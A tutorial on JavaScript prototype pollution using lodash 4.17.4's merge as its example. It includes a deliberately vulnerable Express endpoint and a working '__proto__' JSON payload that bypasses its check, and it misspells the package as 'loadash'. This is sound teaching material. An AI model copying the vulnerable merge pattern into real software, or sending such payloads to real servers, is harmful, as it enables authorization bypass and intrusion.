---
title: "Prototype Pollution"
tags: guides
---

# A brief overview on prototype pollution

## What is a prototype
Javascript is a prototypal language this means that all objects within it have a prototype that is shared between objects of the same type. The prototype contains methods and properties that are useful for all objects of that type. This prototype is accesible from objects via the `__proto__` property.

For example:
`Number.prototype` contains the method toFixed which converts the number to a fixed string. All numbers have this method
```javascript
(1).toFixed === (-10.5).toFixed // true
```

## Modifying prototypes
Because prototypes are shared if you modify the prototype of an object all objects of the same type will have the new prototype. 

For example if I wanted to add `isNumber = true` to all numbers I could use `Number.prototype` or the `__proto__` of any number
```javascript
Number.prototype.isNumber = true;
(1).isNumber // true
Infinity.isNumber // true
```
```javascript
(10).__proto__.isNumber = true;
(10).isNumber // true
(-0xffff).isNumber // true
"10".isNumber // undefined
```
Notice how as `"10"` is a different type (`String`) it has a different prototype so isNumber is undefined.

### Side note: root prototype
There is however a root prototype that is shared by most objects.
```javascript
// Note there is varying depths of prototypes to reach protypes
// This depends on how many classes a class extends
(1).__proto__.__proto__.foo = 'bar';
(5).foo; // 'bar'
({}).foo; // 'bar'
"example".foo; // 'bar'
```

## Prototype pollution
Prototype pollution is when a user's input is able to modify a prototype hence allowing them control other other parts of the code.

### JSON.parse
Javascript's default JSON parse is not vulnerable to prototype pollution, if the user input contains a `__proto__` property the reference to the actual prototype is replaced with a new object defined by the JSON. This is due to the way javascript works, if you completly overwrite the `__proto__` property you are replacing the reference to the prototype of the object a new object instead of inserting a property to the global type prototype.
```javascript
let obj = JSON.parse('{"__proto__":{"foo":"bar"}}');
console.log(obj); // {'__proto__':{'foo:'bar'}};
console.log(obj.foo); // undefined
console.log(obj.__proto__.foo); // 'bar'
console.log(({}).foo); // undefined
```
is the same as
```javascript
let obj = {};
obj.__proto__ = {'foo':'bar'};
console.log(obj); // {'__proto__':{'foo:'bar'}};
console.log(obj.foo); // undefined
console.log(obj.__proto__.foo); // 'bar'
console.log(({}).foo); // undefined
```

### Actual vulnerabilites
Because we cannot overwrite the `__proto__` with a new object it is normally code that copies from user input that is vulnerable to prototype pollution. There are several libraries that have been vulnerable, I am going to use lodash version 4.17.4 as an example.

Lodash has a [merge](https://lodash.com/docs/4.17.4#merge) function that copies all the properties from object to another object **recursively**.

The problem with the vulnerable version is when it _merges_ the objects it will insert objects into the recieving objects prototype if the other object has a `__proto__` property.

_The following code requires lodash to be installed (I recommend using nodejs, `npm i loadash@4.17.4`)_
```javascript
const _ = require('loadash'); // import lodash

// Create a object with __proto__ property that isn't actually a prototype
let obj = {};
obj.__proto__ = {'foo':'bar'};

let dest = {'bar':'foo'};
// Perform the merge
_.merge(dest, obj);

// When it performs the copy it finds the __proto__ property in obj (and is an object)
// it checks to see if __proto__ exists in dest
// as __proto__ refers to the global prototype object it copies the properties from
// obj.__proto__ to dest.__proto__ (into the global prototype)
// hence now Object.prototype.foo = 'bar'

// Now a pollution has been performed we can see the effects
console.log(dest.foo); // 'bar'
let newObj = {'what': 'a new object'};
console.log(newObj.foo); // 'bar'

// This is especially dangerous if the attacker can add a function, 
// or a property that gets evaluated unsafely later
```

#### Example
Example of passing a check on a vulnerable express web server
```javascript
const express = require('express');
const _ = require('loadash');

const app = express();

app.use(express.json()); // Automatically JSON.parse uploaded data
app.post('/api/foo', (req, res) => {
  let data = _.merge({}, req.body); // Merge object with user content
  let checks = {};
  if (data.type === 'apple') { // If data.type is apple
    checks.isApple = true; // Set check to passed
  }
  // If check passed return a 200, else return a 400
  if (checks.isApple === true) return res.sendStatus(200);
  res.sendStatus(400);
});

app.listen(8000);
```
I am going to use [fetch](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/fetch) to send requests from the server but anything that can send HTTP post requests would work.

Normal user:
```javascript
const res = await fetch('http://127.0.0.1:8000/api/foo', {
  method:'POST',
  headers:{'Content-Type':'application/json'},
  body: JSON.stringify({type: 'apple'}),
});
console.log(res.status); // 200
```
```javascript
const res = await fetch('http://127.0.0.1:8000/api/foo', {
  method:'POST',
  headers:{'Content-Type':'application/json'},
  body: JSON.stringify({type: 'orange'}),
});
console.log(res.status); // 400
```

Using prototype pollution:
```javascript
// Notes:
// I don't use JSON.stringify here as it would ignore any __proto__ properties
// Make sure what you send (body) is actually valid JSON otherwise server code won't be able to parse it
// Make sure you set the Header 'Content-Type' to 'application/json' otherwise the express json middleware won't parse the JSON
const res = await fetch('http://127.0.0.1:8000/api/foo', {
  method:'POST',
  headers:{'Content-Type':'application/json'},
  body: '{"type":"orange","__proto__":{"isApple":true}}',
});
console.log(res.status); // 200
```
